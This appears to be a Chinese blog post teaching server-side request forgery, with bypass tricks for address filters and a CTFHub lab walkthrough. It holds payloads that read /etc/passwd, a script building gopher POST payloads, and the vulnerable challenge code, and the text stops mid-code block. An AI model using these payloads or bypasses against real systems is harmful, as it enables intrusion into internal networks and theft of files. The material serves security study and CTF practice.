        <content type="html"><![CDATA[<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p> SSRF（Server-Side Request Forgery:服务器端请求伪造）是一种由攻击者构造形成并由服务端发起恶意请求的一个安全漏洞。正是因为恶意请求由服务端发起，而服务端能够请求到与自身相连而与外网隔绝的内部网络系统，所以一般情况下，SSRF的攻击目标是攻击者无法直接访问的内网系统。 </p><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p> SSRF漏洞的形成大多是由于服务端提供了从其他服务器应用获取数据的功能而没有对目标地址做过滤和限制。 例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等，利用的就是服务端请求伪造，SSRF漏洞可以利用存在缺陷的WEB应用作为代理攻击远程和本地的服务器</p><h1 id="存在的点"><a href="#存在的点" class="headerlink" title="存在的点"></a>存在的点</h1><pre class="line-numbers language-c" data-language="c"><code class="language-c">社交分享功能：获取超链接的标题等内容进行显示转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览在线翻译：给网址翻译对应网页的内容图片加载<span class="token operator">/</span>下载：例如富文本编辑器中的点击下载图片到本地、通过URL地址加载或下载图片图片<span class="token operator">/</span>文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作数据库内置功能：数据库的比如mongodb的copyDatabase函数邮件系统：比如接收邮件服务器地址编码处理、属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等未公开的api实现以及其他扩展调用URL的功能：可以利用google语法加上这些关键字去寻找SSRF漏洞。一些的url中的关键字有：share、wap、url、link、src、source、target、u、<span class="token number">3</span>g、display、sourceURl、imageURL、domain……从远程服务器请求资源<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="危害："><a href="#危害：" class="headerlink" title="危害："></a>危害：</h1><pre class="line-numbers language-c" data-language="c"><code class="language-c">对外网、服务器所在内网、服务器本地进行端口扫描，获取一些服务的banner信息等。攻击运行在内网或服务器本地的其他应用程序，如redis、mysql等。对内网Web应用进行指纹识别，识别企业内部的资产信息。攻击内外网的Web应用，主要是使用HTTP GET<span class="token operator">/</span>POST请求就可以实现的攻击，（比如Struts2漏洞利用，SQL注入等）利用file协议读取服务器本地文件等。进行跳板攻击等。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h1><ul><li><p>因为SSRF漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的，从而来判断是否存在SSRF漏洞</p></li><li><p>在页面源码中查找访问的资源地址 ，如果该资源地址类型为 </p><pre class="line-numbers language-none"><code class="language-none">www.baidu.com/xxx.php?image=(地址)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>就可能存在SSRF漏洞</p></li></ul><h1 id="相关函数和类"><a href="#相关函数和类" class="headerlink" title="相关函数和类"></a>相关函数和类</h1><ul><li><p>file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中。</p></li><li><p>readfile()：输出一个文件的内容。</p></li><li><p>fsockopen()：打开一个网络连接或者一个Unix 套接字连接。</p></li><li><p>curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。</p></li><li><p>fopen()：打开一个文件文件或者 URL。</p></li></ul><p> 此外，PHP原生类<code>SoapClient</code>在触发反序列化时可导致SSRF</p><h1 id="相关协议"><a href="#相关协议" class="headerlink" title="相关协议"></a>相关协议</h1><ul><li><p>file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容</p></li><li><p>http/s协议：探测内网主机存活</p></li><li><p>dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</p></li><li><p>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</p></li></ul><h1 id="协议简述"><a href="#协议简述" class="headerlink" title="协议简述"></a>协议简述</h1><h2 id="file协议-gt-读取内网文件"><a href="#file协议-gt-读取内网文件" class="headerlink" title="file协议->读取内网文件"></a>file协议-&gt;读取内网文件</h2><pre class="line-numbers language-none"><code class="language-none">ssrf.php?url=file:///etc/passwdssrf.php?url=file:///var/www/html/flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="http-s协议-gt-探测内网存活主机"><a href="#http-s协议-gt-探测内网存活主机" class="headerlink" title="http/s协议-> 探测内网存活主机"></a>http/s协议-&gt; 探测内网存活主机</h2><p> 目标主机的网络配置信息</p><p>目的就是说：获得目标主机的内网网段并进行爆破</p><p>域网IP地址范围分三类，以下IP段为内网IP段：</p><ul><li>C类：192.168.0.0 - 192.168.255.255</li><li>B类：172.16.0.0 - 172.31.255.255</li><li>A类：10.0.0.0 - 10.255.255.255</li></ul><p>然后 可以上burpsuite  对内网网段进行爆破</p><h2 id="扫描内网端口（http-s和dict协议）"><a href="#扫描内网端口（http-s和dict协议）" class="headerlink" title="扫描内网端口（http/s和dict协议）"></a>扫描内网端口（http/s和dict协议）</h2><p>简单举例一些常用的服务</p><p>Redis 6379</p><p>FPM 9000</p><p>Smtp 25</p><p>Mysql 3306</p><p>如果 服务器 它开了 这个 服务 它会报错</p><p>如果没有开的话，会有一个那个 Bad Requset 那个回显请求</p><p>同样也是 可以借助burpsuite去爆破 这些服务</p><h2 id="Gopher协议"><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h2><p>这个协议的简单总结就是 在SSRF中很吃香</p><ul><li>Gopher协议格式</li></ul><pre class="line-numbers language-none"><code class="language-none">URL: gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意：</p><p>gopher协议支持多行。因此要在传输的数据前加一个无用字符。</p><p>比如 <code>gopher://ip:port/_ </code>通常用 <code>_ </code>并不是只能用 <code>_</code> ，gopher协议会吃掉第一个字符 </p><p>这个字符 可以随意</p><ul><li>gopher的默认端口是70</li><li>如果发起POST请求，回车换行需要使用<code>%0D%0A</code>来代替<code>%0A</code></li><li>如果多个参数，参数之间的&amp;也需要进行URL编码</li></ul><h1 id="SSRF的限制："><a href="#SSRF的限制：" class="headerlink" title="SSRF的限制："></a>SSRF的限制：</h1><p>限制请求的端口只能为Web端口，只允许访问HTTP和HTTPS的请求。</p><p>限制域名只能为<a href="http://www.xxx.com/">http://www.xxx.com</a></p><p>限制不能访问内网的IP，以防止对内网进行攻击。</p><p>屏蔽返回的详细信息。</p><h1 id="SSRF漏洞绕过方法："><a href="#SSRF漏洞绕过方法：" class="headerlink" title="SSRF漏洞绕过方法："></a>SSRF漏洞绕过方法：</h1><p>1.@　　　　　　　　　　<a href="http://abc.com@127.0.0.1/">http://abc.com@127.0.0.1</a></p><p>2.添加端口号　　　　　　<a href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a></p><p>3.短地址　　　　　　　　<a href="https://0x9.me/cuGfD">https://0x9.me/cuGfD</a></p><p>4.可以指向任意ip的域名　 xip.io</p><p>5.ip地址转换成进制来访问 192.168.0.1=32322</p><h3 id="利用HTTP基本身份认证的方式绕过"><a href="#利用HTTP基本身份认证的方式绕过" class="headerlink" title="利用HTTP基本身份认证的方式绕过"></a>利用HTTP基本身份认证的方式绕过</h3><p>如果目标代码限制访问的域名只能为 <a href="http://www.xxx.com/">http://www.xxx.com</a>，那么我们可以采用HTTP基本身份认证的方式绕过。即 </p><pre class="line-numbers language-none"><code class="language-none">@:[http://www.xxx.com@www.evil.com](http://www.evil.com/)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="利用302跳转绕过内网IP"><a href="#利用302跳转绕过内网IP" class="headerlink" title="利用302跳转绕过内网IP"></a>利用302跳转绕过内网IP</h2><p>绕过对内网ip的限制我们可以利用302跳转的方法，有以下两种。</p><p>（1）网络上存在一个很神奇的服务，网址为 <a href="http://xip.io,当访问这个服务的任意子域名的时候,都会重定向到这个子域名/">http://xip.io，当访问这个服务的任意子域名的时候，都会重定向到这个子域名</a></p><p>举个例子：</p><p>当我们访问：<a href="http://127.0.0.1.xip.io/flag.php%E6%97%B6%EF%BC%8C%E5%AE%9E%E9%99%85%E8%AE%BF%E9%97%AE%E7%9A%84%E6%98%AFhttp://127.0.0.1/1.php%E3%80%82">http://127.0.0.1.xip.io/flag.php时，实际访问的是http://127.0.0.1/1.php。</a></p><p>像这种网址还有<a href="http://nip.io,http//sslip.io">http://nip.io，http://sslip.io</a></p><p> （2）短地址跳转绕过，这里也给出一个网址 <a href="https://4m.cn/">https://4m.cn/</a></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182054054.png" alt="1616809835527"></p><h2 id="进制的转换绕过内网IP"><a href="#进制的转换绕过内网IP" class="headerlink" title="进制的转换绕过内网IP"></a>进制的转换绕过内网IP</h2><p>可以使用一些不同的进制替代ip地址，从而绕过WAF</p><p>这里贴一个php脚本可以一键转换</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$ip = '127.0.0.1';$ip = explode('.',$ip);$r = ($ip[0] &lt;&lt; 24) | ($ip[1] &lt;&lt; 16) | ($ip[2] &lt;&lt; 8) | $ip[3] ;if($r &lt; 0) {$r += 4294967296;}echo "十进制:";     echo $r;echo "八进制:";    echo decoct($r);echo "十六进制:";  echo dechex($r);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="其他各种指向127-0-0-1的地址"><a href="#其他各种指向127-0-0-1的地址" class="headerlink" title="其他各种指向127.0.0.1的地址"></a>其他各种指向127.0.0.1的地址</h2><pre class="line-numbers language-none"><code class="language-none">http://localhost/       # localhost就是代指127.0.0.1http://0/               # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1http://[0:0:0:0:0:ffff:127.0.0.1]/    # 在liunx下可用，window测试了下不行http://[::]:80/           # 在liunx下可用，window测试了下不行http://127。0。0。1/       # 用中文句号绕过http://①②⑦.⓪.⓪.①http://127.1/http://127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单实战 一下</p><h1 id="从CTHHUB-入手"><a href="#从CTHHUB-入手" class="headerlink" title="从CTHHUB 入手"></a>从CTHHUB 入手</h1><h2 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182059190.png" alt="1616567132476"></p><p> 看题目，是让我们从目标主机内网环境访问其本地的flag.php，一下就想到SSRF</p><p>直接秒了</p><p>构造payload：</p><pre class="line-numbers language-none"><code class="language-none">/?url=http://127.0.0.1/flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182059610.png" alt="1616567242311"></p><p>Web目录：/var/www/html</p><p>构造payload：</p><pre class="line-numbers language-none"><code class="language-none">/?url=file:///var/www/html/flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182100474.png" alt="1616567541968"></p><p> 既然告诉了我们是内网端口扫描，那我们就要利用ssrf漏洞探测目标主机上还开放了哪些端口。</p><p>在SSRF中，<code>dict</code>协议与<code>http</code>协议可用来探测内网的主机存活与端口开放情况</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182100846.png" alt="image-20211118150425739"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182107838.png" alt="image-20211118150740117"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182100357.png" alt="image-20211118150506350"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182100818.png" alt="image-20211118150723945"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182100372.png" alt="image-20211118150754943"></p><p>在目标主机的8054端口上发现了Apache的web服务</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182100052.png" alt="image-20211118150650329"></p><p>再利用ssrf+http协议访问目标主机的8054端口</p><pre class="line-numbers language-none"><code class="language-none">/?url=http://127.0.0.1:8054<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182100440.png" alt="image-20211118150856605"></p><h2 id="第二部分（Gopher协议的利用）"><a href="#第二部分（Gopher协议的利用）" class="headerlink" title="第二部分（Gopher协议的利用）"></a>第二部分（Gopher协议的利用）</h2><p>利用此协议可以攻击内网的 Redis、Mysql、FastCGI、Ftp等等，也可以发送 GET、POST 请求</p><h2 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h2><p>进行目录扫描  这边我用dirsearch</p><p>安装的话 自己找找教程</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182100452.png" alt="1616724330762"></p><p>直接上file协议 读取出来</p><p>index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: /?url=_"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_FOLLOWLOCATION</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Just View From 127.0.0.1"</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$flag</span><span class="token operator">=</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"CTFHUB"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/flag.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>key<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token comment">&lt;!-- Debug: key=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$key</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>--&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析flag.php</p><p>首先是要求 从本地访问，暗示我们用http协议呗</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182100803.png" alt="1616724530210"></p><p>右键源代码 拿到key</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182100008.png" alt="1616811588646"></p><pre class="line-numbers language-none"><code class="language-none">key=dd8f097e76106c69e598fb475a4662c0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>构造post请求</p><pre class="line-numbers language-none"><code class="language-none">POST /flag.php HTTP/1.1Host: 127.0.0.1:80Content-Type: application/x-www-form-urlencodedContent-Length: 36key=dd8f097e76106c69e598fb475a4662c0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里要说明 Content-Length的值 应该为你 POST 请求的长度</p><p>URL二次编码 注意的是要第一次要手动改的东西</p><p>把+号删了</p><p>把%0A改成%0D%0A</p><p>这里贴一个 师傅的脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parsepayload <span class="token operator">=</span>\<span class="token triple-quoted-string string">"""POST /flag.php HTTP/1.1Host: 127.0.0.1Content-Type: application/x-www-form-urlencodedContent-Length: 36key=dd8f097e76106c69e598fb475a4662c0"""</span>  tmp <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>new <span class="token operator">=</span> tmp<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'%0A'</span><span class="token punctuation">,</span><span class="token string">'%0D%0A'</span><span class="token punctuation">)</span>result <span class="token operator">=</span> <span class="token string">'gopher://127.0.0.1:80/'</span><span class="token operator">+</span><span class="token string">'_'</span><span class="token operator">+</span>newresult <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>       <span class="token comment"># 这里因为是GET请求所以要进行两次url编码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">脚本分析urllib.request 发送http请求urllib.error 处理请求过程中,出现的异常。urllib.parse 解析urlurllib.robotparser 解析robots.txt 文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果 就是下面这样</p><pre class="line-numbers language-none"><code class="language-none">gopher%3A//127.0.0.1%3A80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253Ddd8f097e76106c69e598fb475a4662c0%250D%250A<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后利用index.php 发送payload</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182100542.png" alt="1616813177970"></p><h2 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182100580.png" alt="1616763159300"></p><p>直接去flag.php 盲猜还是 要本地访问</p><p>用http协议</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182101060.png" alt="1616763258549"></p><p>这次就不扫了</p><p>应该还是有flag.php 和 index.php</p><p>所以 直接上file协议 读取出来</p><p>index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: /?url=_"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_FOLLOWLOCATION</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"REMOTE_ADDR"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Just View From 127.0.0.1"</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"CTFHUB"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span>Upload Webshell<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/flag.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 可以发现flag.php确实是个文件上传的页面，且仅要求上传的文件大小大于0即可得到flag，并没有任何过滤</p><p>利用gopher协议上传文件</p><p>修改前端页面 增加提交窗口</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182101125.png" alt="1616814290909"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182101526.png" alt="1616814358140"></p><p>修改成功 随便上传一个空的文件夹  抓包 去改</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111182101948.png" alt="1616763892995"></p><p>将这个POST的包的Host 改成 127.0.0.1</p><p>丢到之前的py脚本 中就可以了</p><p>执行的结果</p><pre class="line-numbers language-none"><code 